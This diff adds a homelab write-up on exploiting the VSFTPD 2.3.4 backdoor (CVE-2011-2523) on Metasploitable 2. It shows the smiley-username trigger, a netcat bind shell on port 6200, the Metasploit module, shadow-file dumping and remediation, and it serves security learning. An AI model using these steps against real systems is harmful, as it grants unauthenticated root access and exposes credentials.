@@ -1,0 +1,155 @@
+---
+title: VSFTPD 2.3.4 Backdoor
+cve: CVE-2011-2523
+severity: critical
+port: 21/tcp
+service: FTP
+target: Metasploitable 2
+date: 2026-02-01
+description: Exploitation of the malicious backdoor injected into VSFTPD 2.3.4, allowing unauthenticated remote code execution via a crafted FTP username trigger. The backdoor listens on port 6200/tcp and grants a root shell without authentication.
+---
+
+## Overview
+
+VSFTPD (Very Secure FTP Daemon) 2.3.4 is one of the first things I knocked out on Metasploitable 2, and it's a good one to start with because the backdoor itself is kind of fascinating from a historical standpoint. Between June 30 and July 1, 2011, someone compromised the official vsftpd download mirror and replaced the source tarball with a trojaned version. The backdoor is dead simple — if a connecting user sends a username that ends with `:)` (a smiley face), the daemon spawns a bind shell on port 6200. That's it. Connect to 6200 and you're root, no password required.
+
+It's a supply chain attack from 2011, and it's a good reminder that package integrity checks aren't just bureaucracy.
+
+## Environment
+
+All of this was done in an isolated KVM/QEMU network on my homelab. Neither VM has internet access — they're sitting on a libvirt isolated network with no outbound routing.
+
+- **Attacker:** Kali Linux — `192.168.122.50`
+- **Target:** Metasploitable 2 — `192.168.122.100`
+- **Tools:** nmap, ncat, Metasploit Framework
+
+## Discovery
+
+Starting with a version scan on port 21:
+
+```bash
+nmap -sV -p 21 192.168.122.100
+```
+
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+Service Info: OS: Unix
+```
+
+Nmap immediately flags `vsftpd 2.3.4`. That version number is all you need — a quick search (or memory) brings up CVE-2011-2523. I also ran the dedicated NSE script to confirm:
+
+```bash
+nmap --script ftp-vsftpd-backdoor -p 21 192.168.122.100
+```
+
+```
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-vsftpd-backdoor:
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2011-2523
+|     Risk factor: High
+|_    References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+```
+
+Confirmed. Let's go.
+
+## Exploitation
+
+### Manual (netcat)
+
+The trigger is sending a username that contains `:)`. The daemon doesn't care about the password — it just needs to see the smiley in the USER field, then it forks a shell on port 6200.
+
+```bash
+# Connect to FTP and send the trigger
+ncat 192.168.122.100 21
+```
+
+```
+220 (vsFTPd 2.3.4)
+USER backdoor:)
+331 Please specify the password.
+PASS anything
+```
+
+At this point the connection stalls — the daemon is busy spawning the shell. Hit `Ctrl+C` and connect to port 6200:
+
+```bash
+ncat 192.168.122.100 6200
+```
+
+```
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+That's root with no authentication. No exploit complexity, no heap spray, no timing tricks. Just a smiley face.
+
+### Via Metasploit
+
+If I want to be quicker about it:
+
+```bash
+msfconsole -q
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.122.100
+run
+```
+
+```
+[*] 192.168.122.100:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.122.100:21 - USER: 331 Please specify the password.
+[+] 192.168.122.100:21 - Backdoor service has been spawned, handling...
+[+] 192.168.122.100:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened
+```
+
+The module handles the trigger and connects back to port 6200 automatically.
+
+## Post-Exploitation
+
+With a root shell I grabbed a few things for documentation:
+
+```bash
+uname -a
+```
+
+```
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+```
+
+```bash
+cat /etc/shadow | head -5
+```
+
+```
+root:$1$Qm0fq1RV$f6GOa9hQj7yVbjLGmN0P.0:14748:0:99999:7:::
+daemon:*:14748:0:99999:7:::
+bin:*:14748:0:99999:7:::
+```
+
+```bash
+netstat -tlnp
+```
+
+Port 6200 is listening alongside 21 — the bind shell persists until the vsftpd process is killed or the machine reboots.
+
+## Remediation
+
+1. **Replace the binary** — Upgrade to vsftpd 2.3.5 or later from a trusted source. Always verify the SHA256 or GPG signature of the tarball before installing.
+2. **Firewall port 21** — FTP in general has no business being exposed to untrusted networks. Restrict access to known management hosts if it's needed at all.
+3. **Firewall port 6200** — If vsftpd 2.3.4 is somehow still present anywhere, block outbound and inbound connections to 6200 at the network perimeter as an emergency measure.
+4. **Replace FTP with SFTP** — FTP transmits credentials in cleartext and the protocol is a pain to firewall. SFTP over SSH is the right answer for file transfer in a modern environment.
+5. **Monitor for supply chain indicators** — Package checksums should be validated against an out-of-band source (not the same mirror you downloaded from).
+
+## References
+
+- [NVD — CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
+- [VSFTPD backdoor announcement, vsftpd mailing list, July 2011](http://vsftpd.beasts.org/FILES/ChangeLog)
+- [Metasploit module: exploit/unix/ftp/vsftpd_234_backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
+- [Nmap NSE: ftp-vsftpd-backdoor](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html)
+- [Offensive Security — Metasploitable 2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)
